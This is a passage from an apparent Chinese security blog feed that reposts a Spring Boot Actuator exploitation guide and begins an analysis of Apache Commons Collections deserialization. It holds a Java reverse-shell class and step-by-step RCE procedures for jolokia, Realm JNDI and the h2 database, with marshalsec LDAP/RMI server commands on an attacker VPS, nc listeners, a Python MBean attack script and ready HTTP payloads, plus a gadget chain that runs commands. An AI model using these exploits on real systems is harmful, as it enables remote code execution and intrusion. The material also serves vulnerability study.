             cmd = <span class="keyword">new</span> String[]&#123;py_path, <span class="string">"-c"</span>, <span class="string">"import pty;pty.spawn(\"/bin/sh\")"</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> File(<span class="string">"/bin/bash"</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            Process p = (<span class="keyword">new</span> ProcessBuilder(cmd)).redirectErrorStream(<span class="keyword">true</span>).start();</span><br><span class="line">            Socket s = <span class="keyword">new</span> Socket(ip, Integer.parseInt(port));</span><br><span class="line">            InputStream pi = p.getInputStream();</span><br><span class="line">            InputStream pe = p.getErrorStream();</span><br><span class="line">            InputStream si = s.getInputStream();</span><br><span class="line">            OutputStream po = p.getOutputStream();</span><br><span class="line">            OutputStream so = s.getOutputStream();</span><br><span class="line">            <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">                <span class="keyword">while</span>(pi.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pi.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(pe.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pe.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(si.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    po.write(si.read());</span><br><span class="line">                &#125;</span><br><span class="line">                so.flush();</span><br><span class="line">                po.flush();</span><br><span class="line">                Thread.sleep(<span class="number">50L</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    p.exitValue();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p.destroy();</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">javac -<span class="built_in">source</span> 1.5 -target 1.5 JNDIObject.java</span><br><span class="line">```   </span><br><span class="line"></span><br><span class="line">然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤四：架设恶意 ldap 服务</span><br><span class="line">下载 [marshalsec](https://github.com/mbechler/marshalsec/releases) ，</span><br><span class="line">```bash</span><br><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>使用下面命令架设对应的 ldap 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口<br>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure><p>步骤六：从外部 URL 地址加载日志配置文件<br>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/<span class="built_in">exec</span>/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure><p>漏洞原理：    </p><ul><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞  </li></ul><p>漏洞分析：</p><p><a href="https://xz.aliyun.com/t/4258" target="_blank" rel="noopener">spring boot actuator rce via jolokia</a></p><h1 id="jolokia-Realm-JNDI-RCE"><a href="#jolokia-Realm-JNDI-RCE" class="headerlink" title="jolokia Realm JNDI RCE"></a>jolokia Realm JNDI RCE</h1><p>利用条件：</p><ul><li>目标网站存在 /jolokia 或 /actuator/jolokia 接口</li><li>目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过</li></ul><p>利用方法：<br>步骤一：查看已存在的 MBeans<br>访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。</p><p>步骤二：准备要执行的 Java 代码<br>编写优化过后的用来反弹 shell 的 Java 示例代码<a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java" target="_blank" rel="noopener"> JNDIObject.java</a>。</p><p>步骤三：托管 class 文件<br>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">80</span></span><br><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><p>步骤四：架设恶意 rmi 服务<br>下载 marshalsec ，使用下面命令架设对应的 rmi 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/<span class="comment">#JNDIObject 1389</span></span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口<br>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6666</span><br></pre></td></tr></table></figure><p>步骤六：发送恶意 payload<br>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py" target="_blank" rel="noopener">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1:8080/jolokia'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_realm = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:type=MBeanFactory"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"createJNDIRealm"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: [<span class="string">"Tomcat:type=Engine"</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wirte_factory = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"contextFactory"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write_url = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"WRITE"</span>,</span><br><span class="line">    <span class="string">"attribute"</span>: <span class="string">"connectionURL"</span>,</span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"rmi://your-vps-ip:1389/JNDIObject"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"stop"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">"mbean"</span>: <span class="string">"Tomcat:realmPath=/realm0,type=Realm"</span>,</span><br><span class="line">    <span class="string">"type"</span>: <span class="string">"EXEC"</span>,</span><br><span class="line">    <span class="string">"operation"</span>: <span class="string">"start"</span>,</span><br><span class="line">    <span class="string">"arguments"</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flow = [create_realm, wirte_factory, write_url, stop, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flow:</span><br><span class="line">    print(<span class="string">'%s MBean %s: %s ...'</span> % (i[<span class="string">'type'</span>].title(), i[<span class="string">'mbean'</span>], i.get(<span class="string">'operation'</span>, i.get(<span class="string">'attribute'</span>))))</span><br><span class="line">    r = requests.post(url, json=i)</span><br><span class="line">    r.json()</span><br><span class="line">    print(r.status_code)</span><br></pre></td></tr></table></figure><p>漏洞原理：</p><ul><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ul><p>漏洞分析：<br>[<a href="https://paper.seebug.org/851/]" target="_blank" rel="noopener">https://paper.seebug.org/851/]</a>(Attack Spring Boot Actuator via jolokia Part 2)</p><h1 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h1><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 /env 接口设置属性</li><li>可以 POST 请求目标网站的 /restart 接口重启应用</li><li>存在 com.h2database.h2 依赖（版本要求暂未知）</li></ul><p>利用方法：<br>步骤一：设置 spring.datasource.hikari.connection-test-query 属性<br>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发  </p><p>spring 1.x（无回显执行命令）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(<span class="string">'void ex(String m1,String m2,String m3)throws Exception&#123;Runti'</span>,<span class="string">'me.getRun'</span>,<span class="string">'time().exe'</span>,<span class="string">'c(new String[]&#123;m1,m2,m3&#125;);&#125;'</span>);CALL T5(<span class="string">'cmd'</span>,<span class="string">'/c'</span>,<span class="string">'calc'</span>);</span><br></pre></td></tr></table></figure><p>spring 2.x（无回显执行命令）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"name"</span>:<span class="string">"spring.datasource.hikari.connection-test-query"</span>,<span class="string">"value"</span>:<span class="string">"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception&#123;Runti','me.getRun','time().exe','c(new String[]&#123;m1,m2,m3&#125;);&#125;');CALL T5('cmd','/c','calc');"</span>&#125;</span><br></pre></td></tr></table></figure><p>步骤二：重启应用<br>spring 1.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br></pre></td></tr></table></figure><p>漏洞原理： </p><ul><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ul><p>漏洞分析：<br><a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database" target="_blank" rel="noopener">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p><h1 id="h2-database-console-JNDI-RCE"><a href="#h2-database-console-JNDI-RCE" class="headerlink" title="h2 database console JNDI RCE"></a>h2 database console JNDI RCE</h1><p>利用条件：</p><ul><li>存在 com.h2database.h2 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console spring.h2.console.enabled=true</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li></ul><p>利用方法：<br>步骤一：访问路由获得 jsessionid<br>直接访问目标开启 h2 console 的默认路由 /h2-console，目标会跳转到页面 /h2-console/login.jsp?jsessionid=xxxxxx，记录下实际的 jsessionid=xxxxxx 值。</p><p>步骤二：准备要执行的 Java 代码<br>编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java，</p><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure><p>然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。</p><p>步骤三：托管 class 文件<br>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将步骤二中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><p>步骤四：架设恶意 ldap 服务<br>下载 marshalsec ，使用下面命令架设对应的 ldap 服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;your-vps-ip:80&#x2F;#JNDIObject 1389</span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口<br>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure><p>步骤六：发包触发 JNDI 注入<br>根据实际情况，替换下面数据中的 jsessionid=xxxxxx、<a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 和 ldap://your-vps-ip:1389/JNDIObject</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;h2-console&#x2F;login.do?jsessionid&#x3D;xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Referer: http:&#x2F;&#x2F;www.example.com&#x2F;h2-console&#x2F;login.jsp?jsessionid&#x3D;xxxxxx</span><br><span class="line"></span><br><span class="line">language&#x3D;en&amp;setting&#x3D;Generic+H2+%28Embedded%29&amp;name&#x3D;Generic+H2+%28Embedded%29&amp;driver&#x3D;javax.naming.InitialContext&amp;url&#x3D;ldap:&#x2F;&#x2F;your-vps-ip:1389&#x2F;JNDIObject&amp;user&#x3D;&amp;password&#x3D;</span><br></pre></td></tr></table></figure><p>漏洞分析：</p><h1 id="mysql-jdbc-deserialization-RCE"><a href="#mysql-jdbc-deserialization-RCE" class="headerlink" title="mysql jdbc deserialization RCE"></a>mysql jdbc deserialization RCE</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/LandGrey/SpringBootVulExploit" target="_blank" rel="noopener">https://github.com/LandGrey/SpringBootVulExploit</a><br><a href="https://www.t00ls.net/articles-56671.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-56671.html</a><br>有趣的SpEL注入：<a href="https://xz.aliyun.com/t/9252" target="_blank" rel="noopener">https://xz.aliyun.com/t/9252</a></p><p>JAVA JNDI注入知识详解：<a href="http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/</a></p><p>Java安全之JNDI注入:<a href="https://www.anquanke.com/post/id/221917" target="_blank" rel="noopener">https://www.anquanke.com/post/id/221917</a><br><a href="https://www.anquanke.com/post/id/212186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/212186</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;springboot相关漏洞学习 &lt;/p&gt;
&lt;p&gt;转载&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/LandGrey/SpringBootVulExploit&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections漏洞分析</title>
    <link href="https://blog.cfyqy.com/article/f1de98ef.html"/>
    <id>https://blog.cfyqy.com/article/f1de98ef.html</id>
    <published>2021-03-09T12:34:08.000Z</published>
    <updated>2021-03-10T08:09:42.839Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p><a id="more"></a><p><img src="../../images/java/comcol/1.png" alt="">    </p><ul><li><p>CommonsCollections1</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：AnnotationInvocationHandler</li></ul></li><li><p>CommonsCollections2</p><ul><li>命令执行载体：org.apache.xalan.xsltc.trax.TemplatesImpl</li><li>反序列化载体：PriorityQueue</li><li>PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用InvokerTransformer.transform()转换元素，进而获取第一个元素TemplatesImpl的newTransformer()并调用，最终导致命令执行</li></ul></li><li><p>CommonsCollections3</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：AnnotationInvocationHandler</li><li>除Transformer数组元素组成不同外，与CommonsCollections1基本一致</li></ul></li><li><p>CommonsCollections4</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：PriorityQueue</li><li>PriorityQueue.readObject()执行排序时，TransformingComparator.compare()会调用ChainedTransformer.transform()转换元素，进而遍历执行Transformer数组中的每个元素，最终导致命令执行</li></ul></li><li><p>CommonsCollections5</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：BadAttributeValueExpException</li><li>BadAttributeValueExpException.readObject()当System.getSecurityManager()为null时，会调用TiedMapEntry.toString()，它在getValue()时会通过LazyMap.get()取值，最终导致命令执行</li></ul></li><li><p>CommonsCollections6</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：HashSet</li><li>HashSet.readObject()反序列化各元素后，会调用HashMap.put()将结果放进去，而它通过TiedMapEntry.hashCode()计算hash时，会调用getValue()触发LazyMap.get()导致命令执行</li></ul></li><li><p>CommonsCollections7</p><ul><li>命令执行载体：org.apache.commons.collections.functors.ChainedTransformer</li><li>反序列化载体：Hashtable</li><li>Hashtable#readObject反序列化各元素后，会调用reconstitutionPut，后面利用链中在比较hash值的时候用到了hashcode相等的两个字符串 yy 和 zZ。最后后AbstractMap#equals 触发LazyMap.get()导致命令执行</li></ul></li></ul><p>java -jar ysoserial.jar info    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections1  @frohoff                               commons-collections:3.1                                                                                                     </span><br><span class="line">CommonsCollections10                                        commons-collections:3.2.1                                                                                                   </span><br><span class="line">CommonsCollections2  @frohoff                               commons-collections4:4.0                                                                                                    </span><br><span class="line">CommonsCollections3  @frohoff                               commons-collections:3.1                                                                                                     </span><br><span class="line">CommonsCollections4  @frohoff                               commons-collections4:4.0                                                                                                    </span><br><span class="line">CommonsCollections5  @matthias_kaiser, @jasinner            commons-collections:3.1                                                                                                     </span><br><span class="line">CommonsCollections6  @matthias_kaiser                       commons-collections:3.1                                                                                                     </span><br><span class="line">CommonsCollections7  @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1                                                                                                     </span><br><span class="line">CommonsCollections8                                         commons-collections4:4.0                                                                                                    </span><br><span class="line">CommonsCollections9                                         commons-collections:3.1</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>maven</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">   &lt;dependency&gt;</span><br><span class="line">       &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">       &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">       &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">   &lt;/dependency&gt;</span><br><span class="line"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p>核心利用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">public class ComCol1 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Transformer[] transformers &#x3D; new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;,&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain &#x3D; new ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(null);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Commons Coolections的反序列化漏洞利用链，首先定义一个Transformer的数组，Transformer是一个接口，数组里的元素都继承了这个接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入数据第一个元素ConstantTransformer类中,该类在实例化时候，会将传入的对象赋值给iConstant属性，实现Transformer接口的transform方法中，返回iConstant指向的对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Transformer NULL_INSTANCE = <span class="keyword">new</span> ConstantTransformer((Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title">getInstance</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="keyword">null</span> ? 